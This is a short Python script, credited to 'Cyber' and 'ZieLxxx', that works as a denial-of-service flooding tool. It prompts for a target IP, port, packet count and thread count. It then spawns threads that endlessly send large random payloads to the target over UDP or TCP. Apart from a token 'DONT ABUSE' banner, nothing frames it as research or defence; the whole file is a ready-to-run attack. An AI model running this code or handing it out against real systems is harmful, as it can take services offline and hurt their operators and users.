#Author By Cyber
#Remake By ZieLxxx
import random
import socket
import threading
import os
import time

os.system("clear")
print("#-- REMAKE BY ZIELXXX --#")
print("--> DONT ABUSE YE MANIESSS <--")
print("#-- TOOLS BY ZIELXXX --#")
ip = str(input(" TARGET IP :  "))
port = int(input(" TARGET PORT : "))
choice = str(input(" Gas Gak Tot? (gas/n) : "))
times = int(input(" Packets? :"))
threads = int(input("Threads? : "))
def run():
	data = random._urandom(999888)
	i = random.choice(("[$]","[!]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ZieLxxx!!!")
		except:
			print("[X] ZieLxxx!!!")

def run2():
	data = random._urandom(333666)
	i = random.choice(("[$]","[!]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ZieLxxx!!!")
		except:
			s.close()
			print("[X] MT Kah Banh")

for y in range(threads):
	if choice == 'gas':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
